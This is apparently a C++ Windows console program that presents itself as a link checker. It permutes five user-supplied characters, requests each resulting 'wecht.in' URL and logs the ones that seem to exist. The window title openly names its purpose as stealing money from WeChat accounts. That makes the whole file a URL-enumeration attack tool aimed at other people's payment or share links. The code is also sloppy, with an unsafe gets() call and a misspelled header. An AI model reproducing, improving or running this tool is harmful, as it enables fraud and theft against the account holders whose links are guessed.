This is the program which checks if the unique link is valid or not.
Library imported - libwininet.a conio.o
#include <windows.h>
#include <cstring>
#include <wininet.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <coni.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <time.h>

using namespace std;

fstream fs_obj,fs_link;
int x = 0;
void wait ( int seconds )
{
   clock_t endwait;
   endwait = clock () + seconds * CLK_TCK ;
   while (clock() < endwait) {}
}
void swap(char *p,char *q)
{
   char c;
   c=*p;
   *p=*q;
   *q=c;
}

void perm(char *a,int m,int n)
{
   char str[80] = "http://wecht.in/";
   int r,z;
   if (m == n)
   {
		x=x+1;
      strcat(str, a);
      textcolor(14);
      cout<<"Link ";
		textcolor(12);
		cout<<x;
		textcolor(14);
		cout<<" : ";
		textcolor(10);
      cout<<str;
      textcolor(13);
      cout<<" Status ";
      textcolor(11);
      // system(str);
//-//--------------------------------------------------------------------------------------------------------
      //cout<<InternetCheckConnection("http://www.google.com",FLAG_ICC_FORCE_CONNECTION,0);

		/*if(!(InternetCheckConnection("http://www.google.com",FLAG_ICC_FORCE_CONNECTION,0)))
		{
			textcolor(3);
			cout<<"\n\nNet is not available or Connection is limited\nProgram is exiting in 3 seconds\n";
			wait(3);
			exit(0);
		}*/

      HINTERNET connect = InternetOpen("MyBrowser",INTERNET_OPEN_TYPE_PRECONFIG,NULL, NULL, 0);

      if(!(InternetCheckConnection("http://www.google.com",FLAG_ICC_FORCE_CONNECTION,0)))
      {
		   textcolor(3);
			cout<<"\nInternet not connected or Connection is limited\nProgram is exiting in 3 seconds\n";
         wait(3);
         exit(0);
      }

      HINTERNET OpenAddress = InternetOpenUrl(connect,str, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_KEEP_CONNECTION, 0);
		//cout<<OpenAddress;
      if (!OpenAddress )
      {
         DWORD ErrorNum = GetLastError();
         cout<<"Internal error ,  Error No : "<<ErrorNum<<endl;
         fs_obj.open("wecht.txt",ios::out  | ios::app);
         fs_obj<<"Link "<<x<<" : "<<str<<" Status Internal error , Error No : "<<ErrorNum<<endl;
         fs_obj.close();

         InternetCloseHandle(connect);
		   //system("pause");
         //wait(4);
         //exit(0);
      }
		z=0;
      char DataReceived[80];
      DWORD NumberOfBytesRead = 0;
      while(InternetReadFile(OpenAddress, DataReceived, 80, &NumberOfBytesRead) && NumberOfBytesRead )
      {
         z=z+1;
         //textcolor(15);
         //cout<<z<<" ";
			//textcolor(11);//<<strlen(DataReceived)<<endl;
         //cout<<DataReceived;
      }
      /*if((z<29)&&(z>22))
      {
      	fs_obj.open("wecht.txt",ios::out  | ios::app);
			cout<<"Link expired :-(\n";
         fs_obj<<"Link "<<x<<" : "<<str<<" Status Link expired :-( "<<endl;
			fs_obj.close();
			z=0;//getch();
		}*/
      if((z<41)&&(z>34)||(z==9))
		{
			fs_obj.open("wecht.txt",ios::out  | ios::app);
         fs_obj<<"Link "<<x<<" : "<<str<<" Status Link exist :-) "<<endl;
			fs_obj.close();
			fs_link.open("Link_exist.txt",ios::out  | ios::app);
			fs_link<<str<<endl;
			fs_link.close();
			cout<<"\n\nLink exist in the combination of these unique word , now start this program again and enter another 5 unique word\n\nPress any key to end the program\n";
			z=0;
			getch();
			exit(0);
		}
		else
		{
			fs_obj.open("wecht.txt",ios::out  | ios::app);
			cout<<"Link do not exist :-(\n";
         fs_obj<<"Link "<<x<<" : "<<str<<" Status Link do not exist :-( "<<endl;
			fs_obj.close();
			z=0;//getch();
		}
      InternetCloseHandle(OpenAddress);
      InternetCloseHandle(connect);
      wait(3);
//-//---------------------------------------------------------------------------*/
   }
   else
   {
      for (r = m; r <= n; r++)
      {
         swap((a+m), (a+r));
         perm(a, m+1, n);
         swap((a+m), (a+r)); //backtrack
      }
   }
}

int main(int argc, char *argv[])
{
   clock_t t,w;
   t = clock();
   char a[6],rev[6];
   int i,j,l,flag=1,e,f,g=0,x,y,b=10,c,k=0;
	textcolor(15);
   system("title Udit Raikwar Program for stealing money from wechat account using C++");
	cout<<"Enter 5 last unique word from URL : ";
	textcolor(10);
	gets(a);
   //fgets(a,6,stdin);
   //for(e=0;a[e]!=0;++e);
	e=strlen(a);
	f=e-1;
   textcolor(3);
   if((e>5)||(e<5))
	{
		textcolor(12);
		cout<<"Entered incorrect unique words\n";
		textcolor(14);
		cout<<"Unique words must contains 5 characters\n";
		textcolor(15);
		exit(0);
	}
   Sleep (600);
   for(l=0,f=e-1;f>=0;++l,--f)
   {
      rev[l]=a[f];
   }
   rev[l]='\0';
   for(l=0,f=e-1;l<f/2;++l,--f)
   {
      if(a[l]!=a[f])
      {
         flag=0;
         break;
      }
      else
      {
         flag=2;
      }
   }
	if(flag==2)
   {
      perm(a,0,strlen(a)-1);
   }
   else if(flag==0)
   {
      j=strlen(a);
      k=1;
      for(i=j;i!=0;--i)
      {
         k*=i;
      }
      textcolor(11);
		cout<<"\nThere will be "<<k<<" possible ways , sure you want to proceed the program ?\n";
		textcolor(12);
		cout<<"Press\n";
		textcolor(14);
		cout<<"1 for Yes\n2 for No\n";
		textcolor(15);
      cin>>g;
      if(g==1)
      {
         printf("\n");
         perm(a,0,strlen(a)-1);
      }
      else if(g==2)
      {
		   textcolor(15);
			cout<<"Good Boy !!";
		}
   }
   //system("pause");
   textcolor(15);
   return EXIT_SUCCESS;
}
